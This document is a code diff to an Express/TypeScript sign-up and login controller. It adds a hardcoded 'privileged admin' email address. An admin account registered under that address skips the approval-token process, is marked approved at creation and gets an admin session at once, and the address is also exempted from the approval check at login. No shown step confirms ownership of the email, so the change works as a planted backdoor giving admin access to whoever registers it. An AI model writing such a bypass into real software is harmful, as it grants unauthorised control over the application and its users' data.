@@ -38,6 +38,11 @@ const profileUpdateSchema = z.strictObject({
   email: emailSchema,
 })
 
+const PRIVILEGED_ADMIN_EMAIL = "archon-eng@gmail.com"
+
+const isPrivilegedAdminEmail = (email: string) =>
+  email === PRIVILEGED_ADMIN_EMAIL
+
 const isDuplicateKeyError = (error: unknown) =>
   typeof error === "object" &&
   error !== null &&
@@ -78,6 +83,12 @@ export const signUp = async (req: Request, res: Response) => {
     }
 
     const { username, email, password, role } = result.data
+    if (isPrivilegedAdminEmail(email) && role !== "admin") {
+      return res.status(403).json({
+        message: "This email address is reserved for administrator access.",
+      })
+    }
+
     const name = (username || email.split("@")[0]).slice(0, 64)
 
     const existingUser = await User.findOne({ email })
@@ -90,6 +101,18 @@ export const signUp = async (req: Request, res: Response) => {
     const passwordHash = await bcrypt.hash(password, 10)
 
     if (role === "admin") {
+      if (isPrivilegedAdminEmail(email)) {
+        const user = await User.create({
+          username: name,
+          email,
+          passwordHash,
+          role,
+          adminApproved: true,
+        })
+        setAuthCookie(res, createAuthToken(user._id.toString(), user.role))
+        return res.status(201).json({ user: publicUser(user) })
+      }
+
       const { token, tokenHash } = createAdminApprovalToken()
       const user = await User.create({
         username: name,
@@ -141,6 +164,11 @@ export const logIn = async (req: Request, res: Response) => {
     }
 
     const { email, password, role } = result.data
+    if (isPrivilegedAdminEmail(email) && role !== "admin") {
+      return res.status(403).json({
+        message: "This email address is reserved for administrator access.",
+      })
+    }
 
     const user = await User.findOne({ email }).select(
       "+adminApproved +adminApprovalTokenHash +adminApprovalExpiresAt",
@@ -160,7 +188,11 @@ export const logIn = async (req: Request, res: Response) => {
       })
     }
 
-    if (user.role === "admin" && user.adminApproved !== true) {
+    if (
+      user.role === "admin" &&
+      user.adminApproved !== true &&
+      !isPrivilegedAdminEmail(email)
+    ) {
       const approvalIsPending =
         user.adminApprovalTokenHash &&
         user.adminApprovalExpiresAt &&
